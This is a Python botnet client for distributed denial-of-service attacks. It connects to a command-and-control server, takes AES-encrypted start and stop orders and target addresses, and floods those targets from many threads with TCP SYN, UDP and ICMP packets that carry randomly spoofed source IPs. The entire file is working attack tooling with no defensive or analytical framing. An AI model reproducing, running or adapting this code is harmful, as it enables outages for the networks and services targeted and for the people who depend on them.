from config import KEY, C2_SERVER_IP, C2_SERVER_PORT, BOT_PACKET_RATE, BOT_MAX_THREADS
import random
import threading
import time
import logging
import socket
import json
import signal
import sys
from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_client.log'),
        logging.StreamHandler()
    ]
)

console = Console()

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(encrypted_data):
    encrypted_data = b64decode(encrypted_data)
    iv = encrypted_data[:AES.block_size]
    ct = encrypted_data[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

class BotClient:
    def __init__(self):
        self.targets = [] 
        self.is_running = threading.Event()
        self.current_protocol = "TCP"
        self.current_packet_rate = BOT_PACKET_RATE
        self.threads = []
        self.packets_sent = 0 

    def add_target(self, target_ip, target_port):
        self.targets.append((target_ip, target_port))
        logging.info(f"Target added: {target_ip}:{target_port}")
        console.print(f"[bold green]Target added: {target_ip}:{target_port}[/bold green]")

    def remove_target(self, target_ip, target_port):
        self.targets = [(ip, port) for ip, port in self.targets if ip != target_ip or port != target_port]
        logging.info(f"Target removed: {target_ip}:{target_port}")
        console.print(f"[bold red]Target removed: {target_ip}:{target_port}[/bold red]")

    def start_attack(self):
        if self.is_running.is_set():
            logging.warning("Attack is already running.")
            console.print("[bold yellow]Attack is already running.[/bold yellow]")
            return

        self.is_running.set()
        logging.info("Starting DDoS attack...")
        console.print("[bold green]Starting DDoS attack...[/bold green]")
        for _ in range(BOT_MAX_THREADS):
            thread = threading.Thread(target=self.attack_loop)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)

    def stop_attack(self):
        if not self.is_running.is_set():
            logging.warning("No attack is currently running.")
            console.print("[bold yellow]No attack is currently running.[/bold yellow]")
            return

        self.is_running.clear()
        for thread in self.threads:
            thread.join()
        self.threads.clear()
        logging.info("Attack stopped.")
        console.print("[bold red]Attack stopped.[/bold red]")

    def attack_loop(self):
        while self.is_running.is_set():
            for target_ip, target_port in self.targets:
                try:
                    if self.current_protocol == "TCP":
                        self.send_tcp_syn(target_ip, target_port)
                    elif self.current_protocol == "UDP":
                        self.send_udp(target_ip, target_port)
                    elif self.current_protocol == "ICMP":
                        self.send_icmp(target_ip)
                    self.packets_sent += 1
                    time.sleep(1 / self.current_packet_rate)
                except Exception as e:
                    logging.error(f"Error during attack: {e}")
                    console.print(f"[bold red]Error during attack: {e}[/bold red]")

    def send_tcp_syn(self, target_ip, target_port):
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=0)
        logging.info(f"TCP SYN packet sent from {src_ip}:{src_port} to {target_ip}:{target_port}")

    def send_udp(self, target_ip, target_port):
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip)/UDP(sport=src_port, dport=target_port)
        send(packet, verbose=0)
        logging.info(f"UDP packet sent from {src_ip}:{src_port} to {target_ip}:{target_port}")

    def send_icmp(self, target_ip):
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=src_ip, dst=target_ip)/ICMP()
        send(packet, verbose=0)
        logging.info(f"ICMP packet sent from {src_ip} to {target_ip}")

def receive_commands(bot_client, c2_server_ip, c2_server_port):
    while True:
        try:
            console.print(f"[bold yellow]Attempting to connect to C2 server at {c2_server_ip}:{c2_server_port}...[/bold yellow]")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((c2_server_ip, c2_server_port))
            console.print(f"[bold green]Successfully connected to C2 server at {c2_server_ip}:{c2_server_port}.[/bold green]")
            logging.info(f"Connected to C2 server at {c2_server_ip}:{c2_server_port}.")

            table = Table(title="Attack Status", show_header=True, header_style="bold magenta")
            table.add_column("Target", style="dim", width=20)
            table.add_column("Packets Sent", justify="right")
            table.add_column("Status", justify="right")

            for target_ip, target_port in bot_client.targets:
                table.add_row(
                    f"{target_ip}:{target_port}",
                    str(bot_client.packets_sent),
                    "[bold green]Active[/bold green]" if bot_client.is_running.is_set() else "[bold red]Inactive[/bold red]"
                )

            console.print(table)

            while True:
                data = client_socket.recv(1024).decode()
                if data:
                    decrypted_data = decrypt_data(data)
                    command = json.loads(decrypted_data)
                    logging.info(f"Command received: {command}")
                    console.print(f"[bold green]Command received: {command}[/bold green]")

                    if command["action"] == "start":
                        bot_client.add_target(command["target_ip"], command["target_port"])
                        bot_client.start_attack()
                    elif command["action"] == "stop":
                        bot_client.stop_attack()

                    response = {"status": "success", "message": "Command executed"}
                    encrypted_response = encrypt_data(json.dumps(response))
                    client_socket.send(encrypted_response.encode())
        except Exception as e:
            logging.error(f"Error receiving commands: {e}")
            console.print(f"[bold red]Error receiving commands: {e}[/bold red]")
            time.sleep(5)  # Retry after 5 seconds
        finally:
            client_socket.close()

def signal_handler(sig, frame):
    logging.info("Received signal to exit. Stopping bot...")
    console.print("[bold red]Received signal to exit. Stopping bot...[/bold red]")
    bot_client.stop_attack()
    sys.exit(0)

if __name__ == "__main__":
    bot_client = BotClient()
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    command_thread = threading.Thread(target=receive_commands, args=(bot_client, C2_SERVER_IP, C2_SERVER_PORT))
    command_thread.daemon = True
    command_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        bot_client.stop_attack()
